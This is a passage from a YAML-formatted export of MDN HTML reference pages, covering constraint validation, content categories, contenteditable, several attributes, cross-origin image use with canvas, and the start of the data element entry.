[pseudo-classes](https://developer.mozilla.org/en-US/docs/Web/CSS/Pseudo-classes) are used to represent \\<input\\> elements whose content validates and fails to validate respectively according to the input's type setting. These classes allow the user to style valid or invalid form elements to make it easier to identify elements that are either formatted correctly or incorrectly.\n\n### Controlling the text of constraint violation\n\nThe following items can help with controlling the text of a constraint violation:\n\n- The `setCustomValidity(message)` method on the following elements:\n  - [`<fieldset>`](element/fieldset). Note: Setting a custom validity message on fieldset elements will not prevent form submission in most browsers.\n  - [`<input>`](element/input)\n  - [`<output>`](element/output)\n  - [`<select>`](element/select)\n  - Submit buttons (created with either a [`<button>`](element/button) element with the `submit` type, or an `input` element with the [submit](element/input/submit) type. Other types of buttons do not participate in constraint validation.\n  - [`<textarea>`](element/textarea)\n- The [`ValidityState`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState) interface describes the object returned by the `validity` property of the element types listed above. It represents various ways that an entered value can be invalid. Together, they help explain why an element's value fails to validate, if it's not valid.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Constraint_validation](https://developer.mozilla.org/en-US/docs/Web/HTML/Constraint_validation)"
- name: content (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`content`](element/meta#content)

    [`<meta>`](element/meta)

    A value associated with `http-equiv` or `name` depending on the context.
- name: Content categories
  summary: Most HTML elements are a member of one or more content categories — these categories group elements that share common characteristics
  description: "# Content categories\n\nMost [HTML](index) elements are a member of one or more **content categories** — these categories group elements that share common characteristics. This is a loose grouping (it doesn't actually create a relationship among elements of these categories), but they help define and describe the categories' shared behavior and their associated rules, especially when you come upon their intricate details. It's also possible for elements to not be a member of *any* of these categories.\n\nThere are three types of content categories:\n\n- Main content categories, which describe common rules shared by many elements.\n- Form-related content categories, which describe rules common to form-related elements.\n- Specific content categories, which describe rare categories shared only by a few elements, sometimes only in a specific context.\n\n**Note:** A more detailed discussion of these content categories and their comparative functionalities is beyond the scope of this article; for that, you may wish to read the [relevant portions of the HTML specification](https://html.spec.whatwg.org/multipage/dom.html#kinds-of-content).\n\n## Main content categories\n\n### Metadata content\n\nElements belonging to the *metadata content* category modify the presentation or the behavior of the rest of the document, set up links to other documents, or convey other *out-of-band* information. Everything in the [`<head>`](element/head), including the `<title>`, `<link>`, `<script>`, `<style>`, and the lesser used `<base>`, is metadata content. There is a `<meta>` element for metadata that cannot be represented by these other elements.\n\nThe metadata elements are:\n\n- [`<base>`](element/base)\n- [`<link>`](element/link)\n- [`<meta>`](element/meta)\n- [`<noscript>`](element/noscript)\n- [`<script>`](element/script)\n- [`<style>`](element/style)\n- [`<title>`](element/title)\n\nSome of these elements belong to more than one content category. For example, `<script>` is a member of the metadata, flow, and phrasing content categories, and is a script-supporting element; `<script>` can be used where metadata content, phrasing content, or script-supporting elements are expected.\n\n### Flow content\n\nFlow content is a broad category that encompasses most elements that can go inside the [`<body>`](element/body) element, including heading elements, sectioning elements, phrasing elements, embedding elements, interactive elements, and form-related elements. It also includes text nodes (but not those that only consist of white space characters).\n\nThe flow elements are:\n\n- [`<a>`](element/a)\n- [`<abbr>`](element/abbr)\n- [`<address>`](element/address)\n- [`<article>`](element/article)\n- [`<aside>`](element/aside)\n- [`<audio>`](element/audio)\n- [`<b>`](element/b)\n- [`<bdo>`](element/bdo)\n- [`<bdi>`](element/bdi)\n- [`<blockquote>`](element/blockquote)\n- [`<br>`](element/br)\n- [`<button>`](element/button)\n- [`<canvas>`](element/canvas)\n- [`<cite>`](element/cite)\n- [`<code>`](element/code)\n- [`<data>`](element/data)\n- [`<datalist>`](element/datalist)\n- [`<del>`](element/del)\n- [`<details>`](element/details)\n- [`<dfn>`](element/dfn)\n- [`<dialog>`](element/dialog)\n- [`<div>`](element/div)\n- [`<dl>`](element/dl)\n- [`<em>`](element/em)\n- [`<embed>`](element/embed)\n- [`<fieldset>`](element/fieldset)\n- [`<figure>`](element/figure)\n- [`<footer>`](element/footer)\n- [`<form>`](element/form)\n- [`<h1>`-`<h6>`](element/heading_elements)\n- [`<header>`](element/header)\n- [`<hgroup>`](element/hgroup)\n- [`<hr>`](element/hr)\n- [`<i>`](element/i)\n- [`<iframe>`](element/iframe)\n- [`<img>`](element/img)\n- [`<input>`](element/input)\n- [`<ins>`](element/ins)\n- [`<kbd>`](element/kbd)\n- [`<label>`](element/label)\n- [`<main>`](element/main)\n- [`<map>`](element/map)\n- [`<mark>`](element/mark)\n- [`<math>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/math)\n- [`<menu>`](element/menu)\n- [`<meter>`](element/meter)\n- [`<nav>`](element/nav)\n- [`<noscript>`](element/noscript)\n- [`<object>`](element/object)\n- [`<ol>`](element/ol)\n- [`<output>`](element/output)\n- [`<p>`](element/p)\n- [`<picture>`](element/picture)\n- [`<pre>`](element/pre)\n- [`<progress>`](element/progress)\n- [`<q>`](element/q)\n- [`<ruby>`](element/ruby)\n- [`<s>`](element/s)\n- [`<samp>`](element/samp)\n- [`<search>`](element/search)\n- [`<script>`](element/script)\n- [`<section>`](element/section)\n- [`<select>`](element/select)\n- [`<slot>`](element/slot)\n- [`<small>`](element/small)\n- [`<span>`](element/span)\n- [`<strong>`](element/strong)\n- [`<sub>`](element/sub)\n- [`<sup>`](element/sup)\n- [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg)\n- [`<table>`](element/table)\n- [`<template>`](element/template)\n- [`<textarea>`](element/textarea)\n- [`<time>`](element/time)\n- [`<u>`](element/u)\n- [`<ul>`](element/ul)\n- [`<var>`](element/var)\n- [`<video>`](element/video)\n- [`<wbr>`](element/wbr)\n- plain text\n\nA few other elements belong to this category, but only if a specific condition is fulfilled:\n\n- [`<area>`](element/area), if it is a descendant of a [`<map>`](element/map) element\n- [`<link>`](element/link), if the [itemprop](global_attributes/itemprop) attribute is present\n- [`<meta>`](element/meta), if the [itemprop](global_attributes/itemprop) attribute is present\n\n### Sectioning content\n\nSectioning content, a subset of flow content, creates a [section in the current outline](element/heading_elements) defining the scope of [`<header>`](element/header) and [`<footer>`](element/footer) elements.\n\nThe sectioning elements are:\n\n- [`<article>`](element/article)\n- [`<aside>`](element/aside)\n- [`<nav>`](element/nav)\n- [`<section>`](element/section)\n\n### Heading content\n\nHeading content, a subset of flow content, defines the title of a section. This definition applies both to sections marked by an explicit [sectioning content](#sectioning_content) elements and to those implicitly defined by the heading content itself.\n\nThe heading elements are:\n\n- [`<h1>`-`<h6>`](element/heading_elements)\n- [`<hgroup>`](element/hgroup)\n\n**Note:** Though likely to contain heading content, the [`<header>`](element/header) is not heading content itself.\n\n### Phrasing content\n\nPhrasing content, a subset of flow content, refers to the text and the markup within a document. Sequences of phrasing content make up paragraphs.\n\nThe phrasing elements are:\n\n- [`<abbr>`](element/abbr)\n- [`<audio>`](element/audio)\n- [`<b>`](element/b)\n- [`<bdi>`](element/bdi)\n- [`<bdo>`](element/bdo)\n- [`<br>`](element/br)\n- [`<button>`](element/button)\n- [`<canvas>`](element/canvas)\n- [`<cite>`](element/cite)\n- [`<code>`](element/code)\n- [`<data>`](element/data)\n- [`<datalist>`](element/datalist)\n- [`<dfn>`](element/dfn)\n- [`<em>`](element/em)\n- [`<embed>`](element/embed)\n- [`<i>`](element/i)\n- [`<iframe>`](element/iframe)\n- [`<img>`](element/img)\n- [`<input>`](element/input)\n- [`<kbd>`](element/kbd)\n- [`<label>`](element/label)\n- [`<mark>`](element/mark)\n- [`<math>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/math)\n- [`<meter>`](element/meter)\n- [`<noscript>`](element/noscript)\n- [`<object>`](element/object)\n- [`<output>`](element/output)\n- [`<picture>`](element/picture)\n- [`<progress>`](element/progress)\n- [`<q>`](element/q)\n- [`<ruby>`](element/ruby)\n- [`<s>`](element/s)\n- [`<samp>`](element/samp)\n- [`<script>`](element/script)\n- [`<select>`](element/select)\n- [`<slot>`](element/slot)\n- [`<small>`](element/small)\n- [`<span>`](element/span)\n- [`<strong>`](element/strong)\n- [`<sub>`](element/sub)\n- [`<sup>`](element/sup)\n- [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg)\n- [`<template>`](element/template)\n- [`<textarea>`](element/textarea)\n- [`<time>`](element/time)\n- [`<u>`](element/u)\n- [`<var>`](element/var)\n- [`<video>`](element/video)\n- [`<wbr>`](element/wbr)\n- plain text (including more than just whitespace characters)\n\nA few other elements belong to this category, but only if a specific condition is fulfilled:\n\n- [`<a>`](element/a), if it contains only phrasing content\n- [`<area>`](element/area), if it is a descendant of a [`<map>`](element/map) element\n- [`<del>`](element/del), if it contains only phrasing content\n- [`<ins>`](element/ins), if it contains only phrasing content\n- [`<link>`](element/link), if the [itemprop](global_attributes/itemprop) attribute is present\n- [`<map>`](element/map), if it contains only phrasing content\n- [`<meta>`](element/meta), if the [itemprop](global_attributes/itemprop) attribute is present\n\n### Embedded content\n\nEmbedded content, a subset of flow content, imports another resource or inserts content from another markup language or namespace into the document.\n\nThe embedded content elements are:\n\n- [`<audio>`](element/audio)\n- [`<canvas>`](element/canvas)\n- [`<embed>`](element/embed)\n- [`<iframe>`](element/iframe)\n- [`<img>`](element/img)\n- [`<math>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/math)\n- [`<object>`](element/object)\n- [`<picture>`](element/picture)\n- [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg)\n- [`<video>`](element/video)\n\n### Interactive content\n\nInteractive content, a subset of flow content, includes elements that are specifically designed for user interaction.\n\nThe interactive content elements are:\n\n- [`<button>`](element/button)\n- [`<details>`](element/details)\n- [`<embed>`](element/embed)\n- [`<iframe>`](element/iframe)\n- [`<label>`](element/label)\n- [`<select>`](element/select)\n- [`<textarea>`](element/textarea)\n\nSome elements belong to this category only under specific conditions:\n\n- [`<a>`](element/a), if the [`href`](element/a#href) attribute is present\n- [`<audio>`](element/audio), if the [`controls`](element/audio#controls) attribute is present\n- [`<img>`](element/img), if the [`usemap`](element/img#usemap) attribute is present\n- [`<input>`](element/input), if the [type](element/input#type) attribute is not in the hidden state\n- [`<object>`](element/object), if the [`usemap`](element/object#usemap) attribute is present\n- [`<video>`](element/video), if the [`controls`](element/video#controls) attribute is present\n\n### Palpable content\n\nContent is palpable when it's neither empty nor hidden; it is content that is rendered and is substantive. Elements whose model is flow content should have at least one node which is palpable.\n\nThe palpable elements are:\n\n- [`<a>`](element/a)\n- [`<abbr>`](element/abbr)\n- [`<address>`](element/address)\n- [`<article>`](element/article)\n- [`<aside>`](element/aside)\n- [`<b>`](element/b)\n- [`<bdi>`](element/bdi)\n- [`<bdo>`](element/bdo)\n- [`<blockquote>`](element/blockquote)\n- [`<button>`](element/button)\n- [`<canvas>`](element/canvas)\n- [`<cite>`](element/cite)\n- [`<code>`](element/code)\n- [`<data>`](element/data)\n- [`<del>`](element/del)\n- [`<details>`](element/details)\n- [`<dfn>`](element/dfn)\n- [`<div>`](element/div)\n- [`<em>`](element/em)\n- [`<embed>`](element/embed)\n- [`<fieldset>`](element/fieldset)\n- [`<footer>`](element/footer)\n- [`<figure>`](element/figure)\n- [`<form>`](element/form)\n- [`<iframe>`](element/iframe)\n- [`<img>`](element/img)\n- [`<ins>`](element/ins)\n- [`<kbd>`](element/kbd)\n- [`<label>`](element/label)\n- [`<main>`](element/main)\n- [`<map>`](element/map)\n- [`<mark>`](element/mark)\n- [`<math>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/math) from [MathML](https://developer.mozilla.org/en-US/docs/Web/MathML)\n- [`<meter>`](element/meter)\n- [`<nav>`](element/nav)\n- [`<object>`](element/object)\n- [`<p>`](element/p)\n- [`<picture>`](element/picture)\n- [`<pre>`](element/pre)\n- [`<progress>`](element/progress)\n- [`<q>`](element/q)\n- [`<ruby>`](element/ruby)\n- [`<s>`](element/s)\n- [`<samp>`](element/samp)\n- [`<search>`](element/search)\n- [`<section>`](element/section)\n- [`<select>`](element/select)\n- [`<small>`](element/small)\n- [`<span>`](element/span)\n- [`<strong>`](element/strong)\n- [`<sub>`](element/sub)\n- [`<sup>`](element/sup)\n- [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg) from [SVG](https://developer.mozilla.org/en-US/docs/Web/SVG)\n- [`<table>`](element/table)\n- [`<textarea>`](element/textarea)\n- [`<time>`](element/time)\n- [`<u>`](element/u)\n- [`<var>`](element/var)\n- [`<video>`](element/video)\n- [Autonomous custom elements](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_custom_elements)\n- text that is not inter-element [whitespace](https://developer.mozilla.org/en-US/docs/Glossary/Whitespace)\n\nSome elements belong to this category only under specific conditions:\n\n- [`<audio>`](element/audio), if the [`controls`](element/audio#controls) attribute is present\n- [`<dl>`](element/dl), if the element's children include at least one name-value group\n- [`<input>`](element/input), if the [type](element/input#type) attribute is not in the hidden state\n- [`<ol>`](element/ol), if it's children include at least one [`<li>`](element/li) element\n- [`<ul>`](element/ul), if it's children include at least one [`<li>`](element/li) element\n\n### Form-associated content\n\nForm-associated content is a subset of flow content comprising elements that have a form owner, exposed by a **form** attribute, and can be used everywhere flow content is expected. A form owner is either the containing [`<form>`](element/form) element or the element whose id is specified in the **form** attribute.\n\nThe form-associated elements are:\n\n- [`<button>`](element/button)\n- [`<fieldset>`](element/fieldset)\n- [`<input>`](element/input)\n- [`<label>`](element/label)\n- [`<meter>`](element/meter)\n- [`<object>`](element/object)\n- [`<output>`](element/output)\n- [`<progress>`](element/progress)\n- [`<select>`](element/select)\n- [`<textarea>`](element/textarea)\n\nThis category contains several sub-categories:\n\n[listed](#listed)  \nElements that are listed in the [`form.elements`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements) and `fieldset.elements` collections. Contains [`<button>`](element/button), [`<fieldset>`](element/fieldset), [`<input>`](element/input), [`<object>`](element/object), [`<output>`](element/output), [`<select>`](element/select), and [`<textarea>`](element/textarea).\n\n[labelable](#labelable)  \nElements that can be associated with [`<label>`](element/label) elements. Contains [`<button>`](element/button), [`<input>`](element/input), [`<meter>`](element/meter), [`<output>`](element/output), [`<progress>`](element/progress), [`<select>`](element/select), and [`<textarea>`](element/textarea).\n\n[submittable](#submittable)  \nElements that can be used for constructing the form data set when the form is submitted. Contains [`<button>`](element/button), [`<input>`](element/input), [`<object>`](element/object), [`<select>`](element/select), and [`<textarea>`](element/textarea).\n\n[resettable](#resettable)  \nElements that can be affected when a form is reset. Contains [`<input>`](element/input), [`<output>`](element/output), [`<select>`](element/select), and [`<textarea>`](element/textarea).\n\n## Secondary content categories\n\nThere are some secondary classifications of elements that can be useful to be aware of as well.\n\n### Script-supporting elements\n\n**Script-supporting elements** are elements that don't directly contribute to a document's rendered output. Instead, they serve to support scripts, either by containing or specifying script code directly or by specifying data that will be used by scripts.\n\nThe script-supporting elements are:\n\n- [`<script>`](element/script)\n- [`<template>`](element/template)\n\n## Transparent content model\n\nIf an element has a transparent content model, then its contents must be structured such that they would be valid HTML, even if the transparent element were removed and replaced by the child elements.\n\nFor example, the [`<del>`](element/del) and [`<ins>`](element/ins) elements are transparent:\n\nhtml\n\n```\n<p><del>Shopping</del> <ins>Returns</ins> list</p>\n<ul>\n  <del>\n    <li>Oranges</li>\n    <li>Toilet paper</li>\n  </del>\n  <li>Toothpaste</li>\n</ul>\n```\n\nIf those elements were removed, this fragment would still be valid HTML (if not correct English).\n\nhtml\n\n```\n<p>Shopping Returns list</p>\n<ul>\n  <li>Oranges</li>\n  <li>Toilet paper</li>\n  <li>Toothpaste</li>\n</ul>\n```\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Content_categories](https://developer.mozilla.org/en-US/docs/Web/HTML/Content_categories)"
- name: contenteditable (attribute)
  summary: The contenteditable global attribute is an enumerated attribute indicating if the element should be editable by the user
  description: "# contenteditable\n\nThe `contenteditable` [global attribute](../global_attributes) is an enumerated attribute indicating if the element should be editable by the user. If so, the browser modifies its widget to allow editing.\n\n## Try it\n\n#### HTML Demo: contenteditable\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <blockquote contenteditable=\"true\">\n      <p>Edit this content to add your own quote</p>\n    </blockquote>\n\n    <cite contenteditable=\"true\">-- Write your own name here</cite>\n\n    blockquote {\n      background: #eee;\n      border-radius: 5px;\n      margin: 16px 0;\n    }\n\n    blockquote p {\n      padding: 15px;\n    }\n\n    cite {\n      margin: 16px 32px;\n      font-weight: bold;\n    }\n\n    blockquote p::before {\n      content: '\\201C';\n    }\n\n    blockquote p::after {\n      content: '\\201D';\n    }\n\n    [contenteditable='true'] {\n      caret-color: red;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Value\n\nThe attribute must take one of the following values:\n\n- `true` or an *empty string*, which indicates that the element is editable.\n- `false`, which indicates that the element is not editable.\n- `plaintext-only`, which indicates that the element's raw text is editable, but rich text formatting is disabled.\n\nIf the attribute is given without a value, like `<label contenteditable>Example Label</label>`, its value is treated as an empty string.\n\nIf this attribute is missing or its value is invalid, its value is *inherited* from its parent element: so the element is editable if its parent is editable.\n\nNote that although its allowed values include `true` and `false`, this attribute is an *[enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated)* one and not a *Boolean* one.\n\nYou can set the color used to draw the text insertion [caret](https://developer.mozilla.org/en-US/docs/Glossary/Caret) with the CSS [`caret-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/caret-color) property.\n\nElements that are made editable, and therefore interactive, by using the `contenteditable` attribute can be focused. They participate in sequential keyboard navigation. However, elements with the `contenteditable` attribute nested within other `contenteditable` elements are not added to the tabbing sequence by default. You can add the nested `contenteditable` elements to the keyboard navigation sequence by specifying the `tabindex` value ([`tabindex=\"0\"`](tabindex)).\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                   | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                   | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `contenteditable` | 1       | 12   | 3       | 9     | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `plaintext-only`  | 51      | ≤79  | No      | 38    | ≤13.1  | 51             | No                  | 41            | ≤13.4         | 5.0              | 51              |     |\n\n## See also\n\n- All [global attributes](../global_attributes)\n- [`HTMLElement.contentEditable`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/contentEditable) and [`HTMLElement.isContentEditable`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/isContentEditable)\n- The CSS [`caret-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/caret-color) property\n- [HTMLElement `input` event](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/contenteditable](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/contenteditable)"
- name: controls (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`controls`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/controls)

    [`<audio>`](element/audio), [`<video>`](element/video)

    Indicates whether the browser should show playback controls to the user.
- name: coords (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`coords`](element/area#coords)

    [`<area>`](element/area)

    A set of values specifying the coordinates of the hot-spot region.
- name: CORS enabled image
  summary: HTML provides a crossorigin attribute for images that, in combination with an appropriate CORS header, allows images defined by the <img> element that are loaded from foreign origins to be used in a <canvas> as if they had been loaded from the current origin
  description: "# Allowing cross-origin use of images and canvas\n\nHTML provides a [`crossorigin`](element/img#crossorigin) attribute for images that, in combination with an appropriate [CORS](https://developer.mozilla.org/en-US/docs/Glossary/CORS) header, allows images defined by the [`<img>`](element/img) element that are loaded from foreign origins to be used in a [`<canvas>`](element/canvas) as if they had been loaded from the current origin.\n\nSee [CORS settings attributes](attributes/crossorigin) for details on how the `crossorigin` attribute is used.\n\n## Security and tainted canvases\n\nBecause the pixels in a canvas's bitmap can come from a variety of sources, including images or videos retrieved from other hosts, it's inevitable that security problems may arise.\n\nAs soon as you draw into a canvas any data that was loaded from another origin without CORS approval, the canvas becomes **tainted**. A tainted canvas is one which is no longer considered secure, and any attempts to retrieve image data back from the canvas will cause an exception to be thrown.\n\nIf the source of the foreign content is an HTML [`<img>`](element/img) or SVG [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg) element, attempting to retrieve the contents of the canvas isn't allowed.\n\nIf the foreign content comes from an image obtained from either as [`HTMLCanvasElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement) or [`ImageBitMap`](https://developer.mozilla.org/en-US/docs/Web/API/ImageBitmap), and the image source doesn't meet the same origin rules, attempts to read the canvas's contents are blocked.\n\nCalling any of the following on a tainted canvas will result in an error:\n\n- Calling [`getImageData()`](https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/getImageData) on the canvas's context\n- Calling [`toBlob()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/toBlob), [`toDataURL()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/toDataURL) or [`captureStream()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/captureStream) on the [`<canvas>`](element/canvas) element itself\n\nAttempting any of these when the canvas is tainted will cause a `SecurityError` to be thrown. This protects users from having private data exposed by using images to pull information from remote websites without permission.\n\n## Storing an image from a foreign origin\n\nIn this example, we wish to permit images from a foreign origin to be retrieved and saved to local storage. Implementing this requires configuring the server as well as writing code for the website itself.\n\n### Web server configuration\n\nThe first thing we need is a server that's configured to host images with the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header configured to permit cross-origin access to image files.\n\nLet's assume we're serving our site using [Apache](https://httpd.apache.org/). Consider the HTML5 Boilerplate [Apache server configuration file for CORS images](https://github.com/h5bp/server-configs-apache/blob/main/h5bp/cross-origin/images.conf), shown below:\n\nxml\n\n```\n<IfModule mod_setenvif.c>\n  <IfModule mod_headers.c>\n    <FilesMatch \"\\.(avifs?|bmp|cur|gif|ico|jpe?g|jxl|a?png|svgz?|webp)$\">\n      SetEnvIf Origin \":\" IS_CORS\n      Header set Access-Control-Allow-Origin \"*\" env=IS_CORS\n    </FilesMatch>\n  </IfModule>\n</IfModule>\n```\n\nIn short, this configures the server to allow graphic files (those with the extensions \".bmp\", \".cur\", \".gif\", \".ico\", \".jpg\", \".jpeg\", \".png\", \".svg\", \".svgz\", and \".webp\") to be accessed cross-origin from anywhere on the internet.\n\n### Implementing the save feature\n\nNow that the server has been configured to allow retrieval of the images cross-origin, we can write the code that allows the user to save them to [local storage](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API), just as if they were being served from the same domain the code is running on.\n\nThe key is to use the [`crossorigin`](element/img#crossorigin) attribute by setting [`crossOrigin`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/crossOrigin) on the [`HTMLImageElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) into which the image will be loaded. This tells the browser to request cross-origin access when downloading the image data.\n\n#### Starting the download\n\nThe code that starts the download (say, when the user clicks a \"Download\" button), looks like this:\n\njs\n\n```\nfunction startDownload() {\n  let imageURL =\n    \"https://cdn.glitch.com/4c9ebeb9-8b9a-4adc-ad0a-238d9ae00bb5%2Fmdn_logo-only_color.svg?1535749917189\";\n  let imageDescription = \"The Mozilla logo\";\n\n  downloadedImg = new Image();\n  downloadedImg.crossOrigin = \"anonymous\";\n  downloadedImg.addEventListener(\"load\", imageReceived, false);\n  downloadedImg.alt = imageDescription;\n  downloadedImg.src = imageURL;\n}\n```\n\nWe're using a hard-coded URL (`imageURL`) and associated descriptive text (`imageDescription`) here, but that could easily come from anywhere. To begin downloading the image, we create a new [`HTMLImageElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) object by using the [`Image()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/Image) constructor. The image is then configured to allow cross-origin downloading by setting its `crossOrigin` attribute to `\"anonymous\"` (that is, allow non-authenticated downloading of the image cross-origin). An event listener is added for the [`load`](https://developer.mozilla.org/en-US/docs/Web/API/Window/load_event) event being fired on the image element, which means the image data has been received. Alternative text is added to the image; while `<canvas>` does not support the `alt` attribute, the value can be used to set an `aria-label` or the canvas's inner content.\n\nFinally, the image's [`src`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/src) attribute is set to the URL of the image to download; this triggers the download to begin.\n\n#### Receiving and saving the image\n\nThe code that handles the newly-downloaded image is found in the `imageReceived()` method:\n\njs\n\n```\nfunction imageReceived() {\n  const canvas = document.createElement(\"canvas\");\n  const context = canvas.getContext(\"2d\");\n\n  canvas.width = downloadedImg.width;\n  canvas.height = downloadedImg.height;\n  canvas.innerText = downloadedImg.alt;\n\n  context.drawImage(downloadedImg, 0, 0);\n  imageBox.appendChild(canvas);\n\n  try {\n    localStorage.setItem(\"saved-image-example\", canvas.toDataURL(\"image/png\"));\n  } catch (err) {\n    console.error(`Error: ${err}`);\n  }\n}\n```\n\n`imageReceived()` is called to handle the `\"load\"` event on the `HTMLImageElement` that receives the downloaded image. This event is triggered once the downloaded data is all available. It begins by creating a new [`<canvas>`](element/canvas) element that we'll use to convert the image into a data URL, and by getting access to the canvas's 2D drawing context ([`CanvasRenderingContext2D`](https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D)) in the variable `context`.\n\nThe canvas's size is adjusted to match the received image, the inner text is set to the image description, then the image is drawn into the canvas using [`drawImage()`](https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/drawImage). The canvas is then inserted into the document so the image is visible.\n\nNow it's time to actually save the image locally. To do this, we use the Web Storage API's local storage mechanism, which is accessed through the [`localStorage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage) global. The canvas method [`toDataURL()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/toDataURL) is used to convert the image into a data:// URL representing a PNG image, which is then saved into local storage using [`setItem()`](https://developer.mozilla.org/en-US/docs/Web/API/Storage/setItem).\n\n## See also\n\n- [Using Cross-domain images in WebGL and Chrome 13](https://blog.chromium.org/2011/07/using-cross-domain-images-in-webgl-and.html)\n- [HTML Specification - the `crossorigin` attribute](https://html.spec.whatwg.org/multipage/embedded-content.html#attr-img-crossorigin)\n- [Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/CORS_enabled_image](https://developer.mozilla.org/en-US/docs/Web/HTML/CORS_enabled_image)"
- name: crossorigin (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`crossorigin`](attributes/crossorigin)

    [`<audio>`](element/audio), [`<img>`](element/img), [`<link>`](element/link), [`<script>`](element/script), [`<video>`](element/video)

    How the element handles cross-origin requests
- name: csp (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`csp`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/csp) Experimental

    [`<iframe>`](element/iframe)

    Specifies the Content Security Policy that an embedded document must agree to enforce upon itself.
- name: data
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<data\\>: The Data element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since October 2017.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fdata&level=high)\n\nThe `<data>` [HTML](../index) element links a given piece of content with a machine-readable translation. If the content is time- or date-related, the [`<time>`](time) element must be used.\n\n## Try it\n\n#### HTML Demo: \\<data\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>New Products:</p>\n    <ul>\n      <li><data value=\"398\">Mini Ketchup</data></li>\n      <li><data value=\"399\">Jumbo Ketchup</data></li>\n      <li><data value=\"400\">Mega Jumbo Ketchup</data></li>\n    </ul>\n\n    data:hover::after {\n      content: ' (ID ' attr(value) ')';\n      font-size: 0.7em;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n[`value`](#value)  \nThis attribute specifies the machine-readable translation of the content of the element.\n\n## Examples\n\nThe following example displays product names but also associates each name with a product number.\n\nhtml\n\n```\n<p>New Products</p>\n<ul>\n  <li><data value=\"398\">Mini Ketchup</data></li>\n  <li><data value=\"399\">Jumbo Ketchup</data></li>\n  <li><data value=\"400\">Mega Jumbo Ketchup</data></li>\n</ul>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), 